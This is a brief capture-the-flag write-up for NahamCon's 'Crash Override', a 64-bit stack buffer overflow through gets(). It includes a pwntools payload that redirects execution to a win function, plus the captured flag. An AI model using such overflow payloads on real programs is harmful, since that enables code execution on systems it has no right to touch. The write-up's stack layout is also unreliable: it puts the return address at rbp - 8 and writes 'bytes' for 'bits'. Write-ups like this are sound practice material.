# NahamCon - Crash Override

This is a classic buffer overflow challenge :)

Looking at the code, we see that we have a local buffer of 2048 bytes, and an unprotected `gets` function :p

```c
char buffer[2048];

...

gets(buffer);
```

And of course we have to pay attention that we are on 64 bytes!! which means that every address is 8 bytes (and not 4 bytes like in 32 bytes)

Also, we have a `win` function which we need to get to, somehow...

Let's look at the memory layout:

```
buffer			[rbp - 2048]

old rbp			[rbp]

return address  [rbp - 8]

```

So when inputting the buffer, we need to overwrite the 2048 bytes of the buffer, the old rbp, and put the address of `win` instead of the current return address.

We can do this using pwntools:

```python
exploit_str = ("1" * 2048 + "2" * 8).encode() + p64(0x0000000000001289)

```

And... We get the flag!
```
flag{de8b6655b538a0bf567b79a14f2669f6}
```
